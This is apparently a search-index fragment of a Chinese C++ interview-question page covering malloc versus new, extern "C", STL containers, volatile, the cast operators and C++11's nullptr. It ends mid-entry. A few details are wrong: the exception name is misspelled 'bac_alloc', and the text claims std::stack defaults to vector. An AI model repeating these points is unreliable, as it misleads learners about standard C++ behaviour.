new\u64cd\u4f5c\u7b26\u5185\u5b58\u5206\u914d\u6210\u529f\u65f6\uff0c\u8fd4\u56de\u7684\u662f\u5bf9\u8c61\u7c7b\u578b\u7684\u6307\u9488\uff0c\u7c7b\u578b\u4e25\u683c\u4e0e\u5bf9\u8c61\u5339\u914d\uff0c\u65e0\u987b\u8fdb\u884c\u7c7b\u578b\u8f6c\u6362\uff0c\u6545new\u662f\u7b26\u5408\u7c7b\u578b\u5b89\u5168\u6027\u7684\u64cd\u4f5c\u7b26\u3002\u800cmalloc\u5185\u5b58\u5206\u914d\u6210\u529f\u5219\u662f\u8fd4\u56devoid * \uff0c\u9700\u8981\u901a\u8fc7\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\u5c06void*\u6307\u9488\u8f6c\u6362\u6210\u6211\u4eec\u9700\u8981\u7684\u7c7b\u578b\u3002 new\u5185\u5b58\u5206\u914d\u5931\u8d25\u65f6\uff0c\u4f1a\u629b\u51fabac_alloc\u5f02\u5e38\u3002malloc\u5206\u914d\u5185\u5b58\u5931\u8d25\u65f6\u8fd4\u56deNULL\u3002 new\u4f1a\u5148\u8c03\u7528operator new\u51fd\u6570\uff0c\u7533\u8bf7\u8db3\u591f\u7684\u5185\u5b58\uff08\u901a\u5e38\u5e95\u5c42\u4f7f\u7528malloc\u5b9e\u73b0\uff09\u3002\u7136\u540e\u8c03\u7528\u7c7b\u578b\u7684\u6784\u9020\u51fd\u6570\uff0c\u521d\u59cb\u5316\u6210\u5458\u53d8\u91cf\uff0c\u6700\u540e\u8fd4\u56de\u81ea\u5b9a\u4e49\u7c7b\u578b\u6307\u9488\u3002delete\u5148\u8c03\u7528\u6790\u6784\u51fd\u6570\uff0c\u7136\u540e\u8c03\u7528operator delete\u51fd\u6570\u91ca\u653e\u5185\u5b58\uff08\u901a\u5e38\u5e95\u5c42\u4f7f\u7528free\u5b9e\u73b0\uff09\u3002malloc/free\u662f\u5e93\u51fd\u6570\uff0c\u53ea\u80fd\u52a8\u6001\u7684\u7533\u8bf7\u548c\u91ca\u653e\u5185\u5b58\uff0c\u65e0\u6cd5\u5f3a\u5236\u8981\u6c42\u5176\u505a\u81ea\u5b9a\u4e49\u7c7b\u578b\u5bf9\u8c61\u6784\u9020\u548c\u6790\u6784\u5de5\u4f5c\u3002 C++\u5141\u8bb8\u91cd\u8f7dnew/delete\u64cd\u4f5c\u7b26\uff0c\u7279\u522b\u7684\uff0c\u5e03\u5c40new\u7684\u5c31\u4e0d\u9700\u8981\u4e3a\u5bf9\u8c61\u5206\u914d\u5185\u5b58\uff0c\u800c\u662f\u6307\u5b9a\u4e86\u4e00\u4e2a\u5730\u5740\u4f5c\u4e3a\u5185\u5b58\u8d77\u59cb\u533a\u57df\uff0cnew\u5728\u8fd9\u6bb5\u5185\u5b58\u4e0a\u4e3a\u5bf9\u8c61\u8c03\u7528\u6784\u9020\u51fd\u6570\u5b8c\u6210\u521d\u59cb\u5316\u5de5\u4f5c\uff0c\u5e76\u8fd4\u56de\u6b64\u5730\u5740\u3002\u800cmalloc\u4e0d\u5141\u8bb8\u91cd\u8f7d\u3002 new\u64cd\u4f5c\u7b26\u4ece\u81ea\u7531\u5b58\u50a8\u533a\uff08free store\uff09\u4e0a\u4e3a\u5bf9\u8c61\u52a8\u6001\u5206\u914d\u5185\u5b58\u7a7a\u95f4\uff0c\u800cmalloc\u51fd\u6570\u4ece\u5806\u4e0a\u52a8\u6001\u5206\u914d\u5185\u5b58\u3002\u81ea\u7531\u5b58\u50a8\u533a\u662fC++\u57fa\u4e8enew\u64cd\u4f5c\u7b26\u7684\u4e00\u4e2a\u62bd\u8c61\u6982\u5ff5\uff0c\u51e1\u662f\u901a\u8fc7new\u64cd\u4f5c\u7b26\u8fdb\u884c\u5185\u5b58\u7533\u8bf7\uff0c\u8be5\u5185\u5b58\u5373\u4e3a\u81ea\u7531\u5b58\u50a8\u533a\u3002\u800c\u5806\u662f\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u7684\u672f\u8bed\uff0c\u662f\u64cd\u4f5c\u7cfb\u7edf\u6240\u7ef4\u62a4\u7684\u4e00\u5757\u7279\u6b8a\u5185\u5b58\uff0c\u7528\u4e8e\u7a0b\u5e8f\u7684\u5185\u5b58\u52a8\u6001\u5206\u914d\uff0cC\u8bed\u8a00\u4f7f\u7528malloc\u4ece\u5806\u4e0a\u5206\u914d\u5185\u5b58\uff0c\u4f7f\u7528free\u91ca\u653e\u5df2\u5206\u914d\u7684\u5bf9\u5e94\u5185\u5b58\u3002\u81ea\u7531\u5b58\u50a8\u533a\u4e0d\u7b49\u4e8e\u5806\uff0c\u5982\u4e0a\u6240\u8ff0\uff0c\u5e03\u5c40new\u5c31\u53ef\u4ee5\u4e0d\u4f4d\u4e8e\u5806\u4e2d\u3002 PS: \u5728C++\u4e2d\uff0c\u5185\u5b58\u533a\u5206\u4e3a5\u4e2a\u533a\uff0c\u5206\u522b\u662f\u5806\u3001\u6808\u3001\u81ea\u7531\u5b58\u50a8\u533a\u3001\u5168\u5c40/\u9759\u6001\u5b58\u50a8\u533a\u3001\u5e38\u91cf\u5b58\u50a8\u533a\uff1b \u5728C\u4e2d\uff0cC\u5185\u5b58\u533a\u5206\u4e3a\u5806\u3001\u6808\u3001\u5168\u5c40/\u9759\u6001\u5b58\u50a8\u533a\u3001\u5e38\u91cf\u5b58\u50a8\u533a\uff1b","title":"malloc \u548c new\uff0cfree \u548c delete \u7684\u533a\u522b"},{"location":"cplusplus/questions/#extern-c","text":"\u4e3b\u8981\u4f5c\u7528\u5c31\u662f\u4e3a\u4e86\u80fd\u591f\u6b63\u786e\u5b9e\u73b0C++\u4ee3\u7801\u8c03\u7528\u5176\u4ed6C\u8bed\u8a00\u4ee3\u7801\u3002\u88abextern \"C\"\u4fee\u9970\u7684\u53d8\u91cf\u548c\u51fd\u6570\u662f\u6309\u7167C\u8bed\u8a00\u65b9\u5f0f\u8fdb\u884c\u7f16\u8bd1\u548c\u94fe\u63a5\u7684\u3002 \u7531\u4e8eC++\u652f\u6301\u51fd\u6570\u91cd\u8f7d\uff0c\u56e0\u6b64\u7f16\u8bd1\u5668\u7f16\u8bd1\u51fd\u6570\u7684\u8fc7\u7a0b\u4e2d\u4f1a\u5c06\u51fd\u6570\u7684\u53c2\u6570\u7c7b\u578b\u4e5f\u52a0\u5230\u7f16\u8bd1\u540e\u7684\u4ee3\u7801\u4e2d\uff0c\u800c\u4e0d\u4ec5\u4ec5\u662f\u51fd\u6570\u540d\uff1b\u800cC\u8bed\u8a00\u5e76\u4e0d\u652f\u6301\u51fd\u6570\u91cd\u8f7d\uff0c\u56e0\u6b64\u7f16\u8bd1C\u8bed\u8a00\u4ee3\u7801\u7684\u51fd\u6570\u65f6\u4e0d\u4f1a\u5e26\u4e0a\u51fd\u6570\u7684\u53c2\u6570\u7c7b\u578b\uff0c\u4e00\u822c\u53ea\u5305\u62ec\u51fd\u6570\u540d\u3002\u8fd9\u4e2a\u529f\u80fd\u5341\u5206\u6709\u7528\u5904\uff0c\u56e0\u4e3a\u5728C++\u51fa\u73b0\u4ee5\u524d\uff0c\u5f88\u591a\u4ee3\u7801\u90fd\u662fC\u8bed\u8a00\u5199\u7684\uff0c\u800c\u4e14\u5f88\u5e95\u5c42\u7684\u5e93\u4e5f\u662fC\u8bed\u8a00\u5199\u7684\uff0c\u4e3a\u4e86\u66f4\u597d\u7684\u652f\u6301\u539f\u6765\u7684C\u4ee3\u7801\u548c\u5df2\u7ecf\u5199\u597d\u7684C\u8bed\u8a00\u5e93\uff0c\u9700\u8981\u5728C++\u4e2d\u5c3d\u53ef\u80fd\u7684\u652f\u6301C\uff0c\u800cextern \"C\"\u5c31\u662f\u5176\u4e2d\u7684\u4e00\u4e2a\u7b56\u7565\u3002 \u88abextern \"C\"\u9650\u5b9a\u7684\u51fd\u6570\u6216\u53d8\u91cf\u662fextern\u7c7b\u578b\u7684\uff0cextern\u662fC/C++\u8bed\u8a00\u4e2d\u8868\u660e\u51fd\u6570\u548c\u5168\u5c40\u53d8\u91cf\u7684\u4f5c\u7528\u8303\u56f4\u7684\u5173\u952e\u5b57\uff0c\u8be5\u5173\u952e\u5b57\u544a\u8bc9\u7f16\u8bd1\u5668\uff0c\u5176\u7533\u660e\u7684\u51fd\u6570\u548c\u53d8\u91cf\u53ef\u4ee5\u5728\u672c\u6a21\u5757\u6216\u5176\u4ed6\u6a21\u5757\u4e2d\u4f7f\u7528\u3002 extern\u5bf9\u5e94\u7684\u5173\u952e\u5b57\u662fstatic\uff0cstatic\u8868\u660e\u53d8\u91cf\u6216\u8005\u51fd\u6570\u53ea\u80fd\u5728\u672c\u6a21\u5757\u4e2d\u4f7f\u7528\uff0c\u56e0\u6b64\uff0c\u88abstatic\u4fee\u9970\u7684\u53d8\u91cf\u6216\u8005\u51fd\u6570\u4e0d\u53ef\u80fd\u88abextern C\u4fee\u9970\u3002","title":"extern C \u7684\u4f5c\u7528"},{"location":"cplusplus/questions/#commonly-used-containers","text":"\u987a\u5e8f\u6027\u5bb9\u5668 vector: \u662f\u4e00\u6bb5\u8fde\u7eed\u7684\u5185\u5b58\u5730\u5740\uff0c\u57fa\u4e8e\u6570\u7ec4\u5b9e\u73b0\uff0c\u5176\u63d0\u4f9b\u4e86\u81ea\u52a8\u5185\u5b58\u7ba1\u7406\u529f\u80fd\uff08\u91c7\u7528\u4e86STL\u666e\u904d\u7684\u5185\u5b58\u7ba1\u7406\u5668allocator\uff09\uff0c\u53ef\u4ee5\u52a8\u6001\u6539\u53d8\u5bf9\u8c61\u957f\u5ea6\uff0c\u63d0\u4f9b\u968f\u673a\u8bbf\u95ee\u3002\u5728\u5c3e\u90e8\u6dfb\u52a0\u548c\u5220\u9664\u5143\u7d20\u7684\u65f6\u95f4\u662f\u5e38\u6570\u7684\uff0c\u4f46\u5728\u5934\u90e8\u6216\u4e2d\u95f4\u5c31\u662f\u7ebf\u6027\u65f6\u95f4\u3002 list: \u975e\u8fde\u7eed\u7684\u5185\u5b58\uff0c\u57fa\u4e8e\u94fe\u8868\u5b9e\u73b0\uff0c\u5c5e\u4e8e\u5faa\u73af\u53cc\u5411\u94fe\u8868\uff0c\u76ee\u7684\u662f\u5b9e\u73b0\u5feb\u901f\u63d2\u5165\u548c\u5220\u9664\uff0c\u4f46\u662f\u968f\u5373\u8bbf\u95ee\u5374\u662f\u6bd4\u8f83\u6162\u3002 forward_list: \u5b9e\u73b0\u4e86\u5355\u94fe\u8868\uff0c\u4e0d\u53ef\u53cd\u8f6c\u3002\u76f8\u6bd4\u4e8elist\uff0cforward_list\u66f4\u7b80\u5355\uff0c\u66f4\u7d27\u51d1\uff0c\u4f46\u529f\u80fd\u4e5f\u66f4\u5c11\u3002 deque: \u53cc\u7aef\u961f\u5217\uff08double-ended queue\uff09\uff0c\u652f\u6301\u968f\u673a\u8bbf\u95ee\uff0c\u4e0evector\u7c7b\u4f3c\uff0c\u4e3b\u8981\u533a\u522b\u5728\u4e8e\uff0c\u4ecedeque\u5bf9\u8c61\u7684\u5f00\u59cb\u4f4d\u7f6e\u63d2\u5165\u548c\u5220\u9664\u5143\u7d20\u7684\u65f6\u95f4\u4e5f\u662f\u5e38\u6570\u7684\uff0c\u6240\u4ee5\u82e5\u591a\u6570\u64cd\u4f5c\u53d1\u751f\u5728\u5e8f\u5217\u7684\u8d77\u59cb\u548c\u7ed3\u5c3e\u5904\uff0c\u5219\u5e94\u8003\u8651\u4f7f\u7528deque\u3002\u4e3a\u5b9e\u73b0\u5728deque\u4e24\u7aef\u6267\u884c\u63d2\u5165\u548c\u5220\u9664\u64cd\u4f5c\u7684\u65f6\u95f4\u4e3a\u5e38\u6570\u65f6\u95f4\u8fd9\u4e00\u76ee\u7684\uff0cdeque\u5bf9\u8c61\u7684\u8bbe\u8ba1\u6bd4vector\u66f4\u4e3a\u590d\u6742\uff0c\u56e0\u6b64\uff0c\u5c3d\u7ba1\u4e8c\u8005\u90fd\u63d0\u4f9b\u5bf9\u5143\u7d20\u7684\u968f\u673a\u8bbf\u95ee\u548c\u5728\u5e8f\u5217\u4e2d\u90e8\u6267\u884c\u7ebf\u6027\u65f6\u95f4\u7684\u63d2\u5165\u548c\u5220\u9664\u64cd\u4f5c\uff0c\u4f46vector\u5bb9\u5668\u6267\u884c\u8fd9\u4e9b\u64cd\u4f5c\u65f6\u901f\u5ea6\u66f4\u5feb\u4e9b\u3002 queue: \u662f\u4e00\u4e2a\u9002\u914d\u5668\u7c7b\uff0c\u5148\u8fdb\u5148\u51fa\u3002queue\u6a21\u677f\u8ba9\u5e95\u5c42\u7c7b\uff08\u9ed8\u8ba4\u662fdeque\uff09\u5c55\u793a\u5178\u578b\u7684\u961f\u5217\u63a5\u53e3\u3002queue\u6a21\u677f\u7684\u9650\u5236\u6bd4deque\u66f4\u591a\uff0c\u5b83\u4e0d\u4ec5\u4e0d\u5141\u8bb8\u968f\u673a\u8bbf\u95ee\u961f\u5217\u5143\u7d20\uff0c\u751a\u81f3\u4e0d\u5141\u8bb8\u904d\u5386\u961f\u5217\u3002\u4e0e\u961f\u5217\u76f8\u540c\uff0c\u53ea\u80fd\u5c06\u5143\u7d20\u6dfb\u52a0\u5230\u961f\u5c3e\u3001\u4ece\u961f\u9996\u5220\u9664\u5143\u7d20\u3001\u67e5\u770b\u961f\u9996\u548c\u961f\u5c3e\u7684\u503c\u3001\u68c0\u67e5\u5143\u7d20\u6570\u76ee\u548c\u6d4b\u8bd5\u961f\u5217\u662f\u5426\u4e3a\u7a7a\u3002 priority_queue: \u662f\u53e6\u4e00\u4e2a\u9002\u914d\u5668\u7c7b\uff0c\u652f\u6301\u7684\u64cd\u4f5c\u4e0equeue\u76f8\u540c\uff0c\u4f46\u6700\u9ad8\u4f18\u5148\u7ea7\u5143\u7d20\u603b\u662f\u7b2c\u4e00\u4e2a\u51fa\u5217\u3002\u4e24\u8005\u4e4b\u95f4\u7684\u4e3b\u8981\u533a\u522b\u5728\u4e8e\uff0c\u5728priority_queue\u4e2d\uff0c\u6700\u5927\u7684\u5143\u7d20\u88ab\u79fb\u5230\u961f\u9996\u3002\u5185\u90e8\u533a\u522b\u5728\u4e8e\uff0c\u9ed8\u8ba4\u7684\u5e95\u5c42\u7c7b\u662fvector\u3002\u53ef\u4ee5\u4fee\u6539\u7528\u4e8e\u786e\u5b9a\u54ea\u4e2a\u5143\u7d20\u653e\u5230\u961f\u9996\u7684\u6bd4\u8f83\u65b9\u5f0f\uff0c\u65b9\u6cd5\u662f\u63d0\u4f9b\u4e00\u4e2a\u53ef\u9009\u7684\u6784\u9020\u51fd\u6570\u53c2\u6570\u3002 stack: \u4e0equeue\u76f8\u4f3c\uff0cstack\u4e5f\u662f\u4e00\u4e2a\u9002\u914d\u5668\u7c7b\uff0c\u5b83\u7ed9\u5e95\u5c42\u7c7b\uff08\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4e3avector\uff09\u63d0\u4f9b\u4e86\u5178\u578b\u7684\u6808\u63a5\u53e3\uff0c\u540e\u8fdb\u5148\u51fa\u3002 \u5173\u8054\u5bb9\u5668: \u4e3b\u8981\u6709map\u548cset\u3002map\u662fkey-value\u5f62\u5f0f\u7684\uff0cset\u662f\u5355\u503c\u3002map\u548cset\u53ea\u80fd\u5b58\u653e\u552f\u4e00\u7684key\u503c\uff0cmultimap\u548cmultiset\u53ef\u4ee5\u5b58\u653e\u591a\u4e2a\u76f8\u540c\u7684key\u503c\u3002\u5e95\u5c42\u90fd\u57fa\u4e8e\u6811\u578b\u7ed3\u6784\u3002 map/multimap: map\u5bb9\u5668\u63d0\u4f9b\u4e00\u4e2a\u952e\u503c\u5bf9(key-value)\u5bb9\u5668\uff0cmap\u4e0emultimap\u5dee\u522b\u4ec5\u4ec5\u5728\u4e8emultimap\u5141\u8bb8\u4e00\u4e2a\u952e\u5bf9\u5e94\u591a\u4e2a\u503c\u3002\u5bf9\u4e8e\u8fed\u4ee3\u5668\u6765\u8bf4\uff0c\u53ef\u4ee5\u4fee\u6539\u5b9e\u503c\uff0c\u800c\u4e0d\u80fd\u4fee\u6539key\u3002map\u4f1a\u6839\u636ekey\u81ea\u52a8\u6392\u5e8f\u3002 set/multiset: set\u7684\u542b\u4e49\u662f\u96c6\u5408\uff0c\u5b83\u662f\u4e00\u4e2a\u6709\u5e8f\u7684\u5bb9\u5668\uff0c\u91cc\u9762\u7684\u5143\u7d20\u90fd\u662f\u6392\u5e8f\u597d\u7684\u652f\u6301\u63d2\u5165\u3001\u5220\u9664\u3001\u67e5\u627e\u7b49\u64cd\u4f5c\uff0c\u5c31\u50cf\u4e00\u4e2a\u96c6\u5408\u4e00\u6837\uff0c\u6240\u6709\u7684\u64cd\u4f5c\u90fd\u662f\u4e25\u683c\u5728logn\u65f6\u95f4\u5185\u5b8c\u6210\uff0c\u6548\u7387\u975e\u5e38\u9ad8\u3002set\u548cmultiset\u7684\u533a\u522b\u662f,set\u63d2\u5165\u7684\u5143\u7d20\u4e0d\u80fd\u76f8\u540c\uff0c\u4f46\u662fmultiset\u53ef\u4ee5\u76f8\u540c\uff0cset\u9ed8\u8ba4\u662f\u81ea\u52a8\u6392\u5e8f\u7684\uff0c\u4f7f\u7528\u65b9\u6cd5\u7c7b\u4f3clist\u3002","title":"\u5e38\u7528\u7684\u5bb9\u5668\u6709\u54ea\u4e9b"},{"location":"cplusplus/questions/#volatile-type-qualifier","text":"volatile\u6307\u51fa\u53d8\u91cf\u662f\u968f\u65f6\u53ef\u80fd\u53d1\u751f\u53d8\u5316\u7684\uff0c\u4e0evolatile\u53d8\u91cf\u6709\u5173\u7684\u8fd0\u7b97\uff0c\u4e0d\u8981\u8fdb\u884c\u7f16\u8bd1\u4f18\u5316\uff0c\u4ee5\u514d\u51fa\u9519\uff0c\u5982\u5728C\u8bed\u8a00\u4e2d\uff0cvolatile\u5173\u952e\u5b57\u53ef\u4ee5\u7528\u6765\u63d0\u9192\u7f16\u8bd1\u5668\u5b83\u540e\u9762\u6240\u5b9a\u4e49\u7684\u53d8\u91cf\u968f\u65f6\u6709\u53ef\u80fd\u6539\u53d8\uff0c\u56e0\u6b64\u7f16\u8bd1\u540e\u7684\u7a0b\u5e8f\u6bcf\u6b21\u9700\u8981\u5b58\u50a8\u6216\u8bfb\u53d6\u8fd9\u4e2a\u53d8\u91cf\u7684\u65f6\u5019\uff0c\u90fd\u4f1a\u76f4\u63a5\u4ece\u53d8\u91cf\u5730\u5740\u4e2d\u8bfb\u53d6\u6570\u636e\u3002\u5982\u679c\u6ca1\u6709volatile\u5173\u952e\u5b57\uff0c\u5219\u7f16\u8bd1\u5668\u53ef\u80fd\u4f18\u5316\u8bfb\u53d6\u548c\u5b58\u50a8\uff0c\u53ef\u80fd\u6682\u65f6\u4f7f\u7528\u5bc4\u5b58\u5668\u4e2d\u7684\u503c\uff0c\u5982\u679c\u8fd9\u4e2a\u53d8\u91cf\u7531\u522b\u7684\u7a0b\u5e8f\u66f4\u65b0\u4e86\u7684\u8bdd\uff0c\u5c06\u51fa\u73b0\u4e0d\u4e00\u81f4\u7684\u73b0\u8c61\u3002 VC++ \u5728\u4ea7\u751frelease\u7248\u53ef\u6267\u884c\u7801\u65f6\u4f1a \u8fdb\u884c\u7f16\u8bd1\u4f18\u5316\uff0c\u52a0volatile\u5173\u952e\u5b57\u7684\u53d8\u91cf\u6709\u5173\u7684\u8fd0\u7b97\uff0c\u5c06\u4e0d\u8fdb\u884c\u7f16\u8bd1\u4f18\u5316\u3002 \u4e00\u4e2a\u5b9a\u4e49\u4e3avolatile\u7684\u53d8\u91cf\u662f\u8bf4\u8fd9\u53d8\u91cf\u53ef\u80fd\u4f1a\u88ab\u610f\u60f3\u4e0d\u5230\u5730\u6539\u53d8\uff0c\u8fd9\u6837\uff0c\u7f16\u8bd1\u5668\u5c31\u4e0d\u4f1a\u53bb\u5047\u8bbe\u8fd9\u4e2a\u53d8\u91cf\u7684\u503c\u4e86\u3002\u7cbe\u786e\u5730\u8bf4\u5c31\u662f\uff0c\u4f18\u5316\u5668\u5728\u7528\u5230\u8fd9\u4e2a\u53d8\u91cf\u65f6\u5fc5\u987b\u6bcf\u6b21\u90fd\u5c0f\u5fc3\u5730\u91cd\u65b0\u8bfb\u53d6\u8fd9\u4e2a\u53d8\u91cf\u7684\u503c\uff0c\u800c\u4e0d\u662f\u4f7f\u7528\u4fdd\u5b58\u5728\u5bc4\u5b58\u5668\u91cc\u7684\u5907\u4efd\u3002\u4e0b\u9762\u662fvolatile\u53d8\u91cf\u7684\u51e0\u4e2a\u4f8b\u5b50\uff1a \u5e76\u884c\u8bbe\u5907\u7684\u786c\u4ef6\u5bc4\u5b58\u5668\uff08\u5982\uff1a\u72b6\u6001\u5bc4\u5b58\u5668\uff09 \u4e00\u4e2a\u4e2d\u65ad\u670d\u52a1\u5b50\u7a0b\u5e8f\u4e2d\u4f1a\u8bbf\u95ee\u5230\u7684\u975e\u81ea\u52a8\u53d8\u91cf(Non-automatic variables) \u591a\u7ebf\u7a0b\u5e94\u7528\u4e2d\u88ab\u51e0\u4e2a\u4efb\u52a1\u5171\u4eab\u7684\u53d8\u91cf \u56de\u7b54\u4e0d\u51fa\u8fd9\u4e2a\u95ee\u9898\u7684\u4eba\u662f\u4e0d\u4f1a\u88ab\u96c7\u4f63\u7684\u3002 \u641e\u5d4c\u5165\u5f0f\u7684\u5bb6\u4f19\u4eec\u7ecf\u5e38\u540c\u786c\u4ef6\u3001\u4e2d\u65ad\u3001RTOS\u7b49\u7b49\u6253\u4ea4\u9053\uff0c\u6240\u6709\u8fd9\u4e9b\u90fd\u8981\u6c42\u7528\u5230volatile\u53d8\u91cf\u3002\u4e0d\u61c2\u5f97volatile\u7684\u5185\u5bb9\u5c06\u4f1a\u5e26\u6765\u707e\u96be\u3002","title":"volatile \u5173\u952e\u5b57\u7684\u4f5c\u7528"},{"location":"cplusplus/questions/#type-conversion","text":"C\u98ce\u683c\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\uff0c\u5982 Type b = (Type)a; C++\u98ce\u683c\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\uff0c\u6709static_cast\u3001const_cast\u3001reinterpret_cast\u548cdynamic_cast\u56db\u79cd\u3002 static_cast: \u6bd4C\u98ce\u683c\u7684\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\u8981\u5b89\u5168\u5f88\u591a\uff0c\u6709\u5f88\u5927\u7a0b\u5ea6\u4e0a\u7684\u7c7b\u578b\u5b89\u5168\u68c0\u67e5\u3002\u4f46\u7ed3\u679c\u53ef\u80fd\u4f1a\u51fa\u9519\uff0c\u800c\u4e14\u7f16\u8bd1\u5668\u4e0d\u4f1a\u7ed9\u51fa\u9519\u8bef\u4fe1\u606f\u3002\u6709\u660e\u663e\u7f3a\u70b9\u7684\uff0c\u90a3\u5c31\u662f\u65e0\u6cd5\u6d88\u9664const\u548cvolatile\u5c5e\u6027\u3002 const_cast: \u53bb\u9664\u6389const\u6216volitale\u5c5e\u6027\u3002\u4e0d\u662f\u7528\u4e8e\u53bb\u9664\u53d8\u91cf\u7684\u5e38\u91cf\u6027\uff0c\u800c\u662f\u53bb\u9664\u6307\u5411\u5e38\u91cf\u5bf9\u8c61\u7684\u6307\u9488\u6216\u5f15\u7528\u7684\u5e38\u91cf\u6027\uff0c\u5176\u53bb\u9664\u5e38\u91cf\u6027\u7684\u5bf9\u8c61\u5fc5\u987b\u4e3a\u6307\u9488\u6216\u5f15\u7528\uff0c\u5e76\u4e14const_cast\u4e0d\u652f\u6301\u4e0d\u540c\u7c7b\u578b\u6307\u9488\u6216\u5f15\u7528\u4e4b\u95f4\u7684\u8f6c\u6362\uff0c\u6bd4\u5982\u8bf4float \u8f6c\u6362\u6210int \u662f\u4e0d\u5141\u8bb8\u7684\uff0c\u76f8\u5dee\u7684\u8bdd\u53ea\u80fd\u5deeconst\u6216volatile\u5c5e\u6027\u3002 reinterpret_cast: \u610f\u4e3a\u201c\u91cd\u65b0\u89e3\u91ca\u201d\uff0c\u5b83\u662fC++\u4e2d\u6700\u63a5\u8fd1\u4e8eC\u98ce\u683c\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\u7684\u4e00\u4e2a\u5173\u952e\u5b57\u3002\u5b83\u8ba9\u7a0b\u5e8f\u5458\u80fd\u591f\u5c06\u4e00\u79cd\u5bf9\u8c61\u7c7b\u578b\u8f6c\u6362\u4e3a\u53e6\u4e00\u79cd\uff0c\u4e0d\u7ba1\u5b83\u4eec\u662f\u5426\u76f8\u5173\u3002\u53ef\u4ee5\u5148\u4f7f\u7528reinterpret_cast\u628a\u4e00\u4e2a\u6307\u9488\u8f6c\u6362\u6210\u4e00\u4e2a\u6574\u6570\uff0c\u518d\u628a\u8be5\u6574\u6570\u8f6c\u6362\u6210\u539f\u7c7b\u578b\u7684\u6307\u9488\uff0c\u8fd8\u53ef\u4ee5\u5f97\u5230\u539f\u5148\u7684\u6307\u9488\u503c\u3002\u4f7f\u7528reinterpret_cast\u5f3a\u5236\u8f6c\u6362\u8fc7\u7a0b\u4ec5\u4ec5\u53ea\u662f\u6bd4\u7279\u4f4d\u7684\u62f7\u8d1d\uff0c\u548cC\u98ce\u683c\u6781\u5176\u76f8\u4f3c\uff0c\u5b9e\u9645\u4e0areinterpret_cast\u7684\u51fa\u73b0\u5c31\u662f\u4e3a\u4e86\u8ba9\u7f16\u8bd1\u5668\u5f3a\u5236\u63a5\u53d7static_cast\u4e0d\u5141\u8bb8\u7684\u7c7b\u578b\u8f6c\u6362\uff0c\u56e0\u6b64\u4f7f\u7528\u7684\u65f6\u5019\u8981\u8c28\u800c\u614e\u4e4b\u3002 dynamic_cast: \u662f\u8fd0\u884c\u65f6\u5904\u7406\u7684\uff0c\u8fd0\u884c\u65f6\u4f1a\u8fdb\u884c\u7c7b\u578b\u68c0\u67e5\uff08\u8fd9\u70b9\u548cstatic_cast\u5dee\u5f02\u8f83\u5927\uff09\u3002\u4e0d\u80fd\u7528\u4e8e\u5185\u7f6e\u57fa\u672c\u6570\u636e\u7c7b\u578b\u7684\u5f3a\u5236\u8f6c\u6362\uff0c\u53ea\u80fd\u5bf9\u6307\u9488\u6216\u5f15\u7528\u8fdb\u884c\u5f3a\u5236\u8f6c\u6362\u3002\u5982\u679c\u8f6c\u6362\u6210\u529f\u7684\u8bdd\u8fd4\u56de\u7684\u662f\u6307\u5411\u7c7b\u7684\u6307\u9488\u6216\u5f15\u7528\uff0c\u8f6c\u6362\u5931\u8d25\u7684\u8bdd\u5219\u4f1a\u8fd4\u56denullptr\u3002\u8fdb\u884c\u4e0a\u884c\u8f6c\u6362\u65f6\uff0c\u4e0estatic_cast\u7684\u6548\u679c\u662f\u5b8c\u5168\u4e00\u6837\u7684\uff0c\u8fdb\u884c\u4e0b\u884c\u8f6c\u6362\u65f6\uff0cdynamic_cast\u5177\u6709\u7c7b\u578b\u68c0\u67e5\u7684\u529f\u80fd\uff0c\u6bd4static_cast\u66f4\u5b89\u5168\u3002\u800c\u4e14dynamic_cast\u8fd0\u884c\u65f6\u7684\u7c7b\u578b\u68c0\u67e5\u9700\u8981\u6709\u8fd0\u884c\u65f6\u7c7b\u578b\u4fe1\u606f\uff0c\u8fd9\u4e2a\u4fe1\u606f\u662f\u5b58\u50a8\u5728\u7c7b\u7684\u865a\u8868\u4e2d\u7684\u3002","title":"\u6709\u54ea\u51e0\u79cd\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\u4ee5\u53ca\u4f7f\u7528\u573a\u666f"},{"location":"cplusplus/questions/#cpp11-new-features","text":"\u7b80\u5355\u8bf4\u4e00\u4e9b\u5e38\u89c1\u7684C++11\u7684\u65b0\u7279\u6027\u3002 nullptr: \u7a7a\u6307\u9488\uff0c\u7528\u6765\u66ff\u4ee3NULL\u3002 \u4f20\u7edf C++ \u4f1a\u628a NULL\u30010 \u89c6\u4e3a\u540c\u4e00\u79cd\u4e1c\u897f\uff0c\u8fd9\u53d6\u51b3\u4e8e\u7f16\u8bd1\u5668\u5982\u4f55\u5b9a\u4e49 NULL\uff0c\u6709\u4e9b\u7f16\u8bd1\u5668\u4f1a\u5c06 NULL \u5b9a\u4e49\u4e3a ((void*)0) \uff0c\u6709\u4e9b\u5219\u4f1a\u76f4\u63a5\u5c06\u5176\u5b9a\u4e49\u4e3a 0\u3002C++ \u4e0d\u5141\u8bb8\u76f4\u63a5\u5c06 void * \u9690\u5f0f\u8f6c\u6362\u5230\u5176\u4ed6\u7c7b\u578b\uff0c\u4f46\u5982\u679c NULL \u88ab\u5b9a\u4e49\u4e3a ((void*)0) \uff0c\u90a3\u4e48\u5f53\u7f16\u8bd1 char *ch = NULL; \u65f6\uff0cNULL \u53ea\u597d\u88ab\u5b9a\u4e49\u4e3a 0\u3002\u800c\u8fd9\u4f9d\u7136\u4f1a\u4ea7\u751f\u95ee\u9898\uff0c\u5c06\u5bfc\u81f4\u4e86 C++ \u4e2d\u91cd\u8f7d\u7279\u6027\u4f1a\u53d1\u751f\u6df7\u4e71\uff0c\u8003\u8651\uff1a void foo(char *); void foo(int); \u5bf9\u4e8e\u8fd9\u4e24\u4e2a\u51fd\u6570\u6765\u8bf4\uff0c\u5982\u679c NULL \u53c8\u88ab\u5b9a\u4e49\u4e3a\u4e86 0 \u90a3\u4e48 foo(NULL); \u8fd9\u4e2a\u8bed\u53e5\u5c06\u4f1a\u53bb\u8c03\u7528 foo(int)\uff0c\u4ece\u800c\u5bfc\u81f4\u4ee3\u7801\u8fdd\u53cd\u76f4\u89c2\u3002\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0cC++11 \u5f15\u5165\u4e86 nullptr 